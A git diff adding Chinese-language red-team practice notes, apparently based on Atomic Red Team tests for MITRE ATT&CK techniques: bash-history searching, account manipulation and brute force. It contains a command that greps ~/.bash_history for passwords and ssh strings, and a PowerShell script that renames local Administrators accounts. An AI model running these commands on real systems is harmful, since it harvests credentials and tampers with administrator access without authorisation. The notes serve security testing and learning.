@@ -89,3 +89,43 @@ set-ExecutionPolicy RemoteSigned
 .\T1056\src\Get-Keystrokes.ps1 -LogPath #{filepath}
 ```
 没有成功,回家再试一下
+### T1139 - Bash History
+红队可以从`~/.bash_history`找一些敏感信息
+###### 测试1 Search Through Bash History
+```
+cat #{bash_history_filename} | grep #{bash_history_grep_args}
+例如
+cat ~/.bash_history | grep -e '-p ' -e 'pass' -e 'ssh'
+```
+成功复现
+### T1098 - Account Manipulation
+帐户操作可以帮助对手维护对环境中的凭据和特定权限级别的访问。修改包括修改凭证,修改权限,添加组,修改账户设置或者修改验证方式.为了修改账户,红队必须首先获得这个操作系统的权限.
+
+对于Exchange Email Account Takeover:允许在本地 Exchange 和基于云的服务中可用,其中Exchange Server 是微软公司的一套电子邮件服务组件，是个消息与协作系统。 简单而言，Exchange server可以被用来构架应用于企业、学校的邮件系统。
+
+对于Azure AD:红队可以设置第二个密码来persistence
+
+对于AWS:AWS通过账户名新人用户.
+###### 测试1 Admin Account Manipulate
+修改账户名称
+```
+$x = Get-Random -Minimum 2 -Maximum 9999
+$y = Get-Random -Minimum 2 -Maximum 9999
+$z = Get-Random -Minimum 2 -Maximum 9999
+$w = Get-Random -Minimum 2 -Maximum 9999
+Write-Host HaHaHa_$x$y$z$w
+
+$hostname = (Get-CIMInstance CIM_ComputerSystem).Name
+
+$fmm = Get-CimInstance -ClassName win32_group -Filter "name = 'Administrators'" | Get-CimAssociatedInstance -Association win32_groupuser | Select Name
+
+foreach($member in $fmm) {
+    if($member -like "*Administrator*") {
+        Rename-LocalUser -Name $member.Name -NewName "HaHaHa_$x$y$z$w"
+        Write-Host "Successfully Renamed Administrator Account on" $hostname
+        }
+    }
+```
+没有复现
+### T1110 - Brute Force
+红队可使用爆破的方法来获取密码
